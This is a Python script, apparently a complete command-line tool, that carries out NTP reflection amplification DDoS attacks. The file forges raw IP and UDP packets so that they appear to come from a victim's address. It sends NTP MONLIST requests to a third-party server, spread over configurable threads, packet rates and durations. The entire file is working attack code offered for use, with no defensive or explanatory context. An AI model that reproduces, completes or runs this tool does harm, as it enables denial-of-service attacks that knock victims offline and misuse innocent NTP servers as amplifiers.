import socket
import struct
import random
import threading
import time

def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return (~s) & 0xffff

def build_ip_header(source_ip, dest_ip):
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0  # kernel will fill the correct total length
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 64
    ip_proto = socket.IPPROTO_UDP
    ip_check = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl

    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

    ip_check = checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    return ip_header

def build_udp_header(source_port, dest_port, data, source_ip, dest_ip):
    udp_length = 8 + len(data)
    udp_checksum = 0

    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, udp_checksum)

    pseudo_header = struct.pack('!4s4sBBH',
                                socket.inet_aton(source_ip),
                                socket.inet_aton(dest_ip),
                                0,
                                socket.IPPROTO_UDP,
                                udp_length)

    checksum_data = pseudo_header + udp_header + data
    udp_checksum = checksum(checksum_data)

    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, udp_checksum)
    return udp_header

def build_ntp_monlist_packet():
    # NTP MONLIST request packet (legacy, but still widely supported)
    return b'\x17\x00\x03\x2a' + b'\x00' * 4

def ntp_reflection_worker(victim_ip, ntp_server_ip, ntp_server_port, duration, pps):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print("Error: Run as root/admin to use raw sockets.")
        return

    end_time = time.time() + duration
    print(f"[NTP] Starting reflection attack on {victim_ip} via {ntp_server_ip}:{ntp_server_port} for {duration}s")

    interval = 1 / pps if pps > 0 else 0

    while time.time() < end_time:
        source_ip = victim_ip
        dest_ip = ntp_server_ip
        data = build_ntp_monlist_packet()
        source_port = random.randint(1024, 65535)
        dest_port = ntp_server_port

        ip_header = build_ip_header(source_ip, dest_ip)
        udp_header = build_udp_header(source_port, dest_port, data, source_ip, dest_ip)
        packet = ip_header + udp_header + data

        try:
            sock.sendto(packet, (dest_ip, 0))
        except Exception as e:
            print(f"[NTP] Send error: {e}")

        if interval > 0:
            time.sleep(interval)

def ntp_reflection_attack(victim_ip, ntp_server_ip, ntp_server_port=123, duration=60, threads=10, pps=100):
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=ntp_reflection_worker, args=(victim_ip, ntp_server_ip, ntp_server_port, duration, pps))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="NTP Reflection DDoS Attack Tool (Raw sockets + IP spoofing)")
    parser.add_argument("victim_ip", help="IP address of the victim")
    parser.add_argument("ntp_server_ip", help="IP address of NTP server to exploit")
    parser.add_argument("--port", type=int, default=123, help="NTP server port (default 123)")
    parser.add_argument("--duration", type=int, default=60, help="Duration of attack in seconds (default 60)")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads to use (default 10)")
    parser.add_argument("--pps", type=int, default=100, help="Packets per second per thread (default 100)")

    args = parser.parse_args()

    ntp_reflection_attack(args.victim_ip, args.ntp_server_ip, args.port, args.duration, args.threads, args.pps)
